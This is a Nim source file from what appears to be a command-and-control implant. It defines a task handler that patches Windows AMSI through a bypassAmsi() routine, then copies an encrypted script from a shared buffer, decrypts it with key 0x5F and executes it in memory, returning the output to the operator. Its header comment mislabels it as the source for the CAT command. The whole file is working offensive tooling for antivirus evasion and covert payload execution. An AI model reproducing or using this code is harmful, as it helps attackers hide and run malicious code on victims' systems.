# This is the source for the CAT command
import os
import json
import std/tables
import ../structs
import ../utils
import ../rth/rth
import ../fileManager
import ../rth/defense-evasion/bypass_amsi
from ../rth/utils/utils as rthu import decrypt
import ../rth/local-execution/execute_powershell

#[
Execute a Powershell command
  {"command": ".\ps-command-to-execute"}

]#
proc cmd_powerscript*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  let psScript = params["script_name"].getStr()
  let psCommand = params["script_arguments"].getStr()

  # Configure Output
  var
    output = ""
    status = ""

  # Get the global Payload Buffer
  if sharedBuffer.hasKey(psScript):
    if bypassAmsi():
      DBG("[+] AMSI Successfully patched")
      var payload = Payload(arguments: parseCmdLine(psCommand))
      # instantiate a new sequence
      payload.bytes = newSeq[byte](sharedBuffer[psScript][0])

      copyMem(addr payload.bytes[0], sharedBuffer[psScript][1], sharedBuffer[psScript][0])
      payload.decrypt(0x5F)
      discard payload.execute()
      # return the output
      output = payload.output
    else:
      DBG("[-] Failed to patch AMSI")
      status = "error"
  else:
    status = "error"

  # return the response
  return buildReturnData(task.id, output, status)

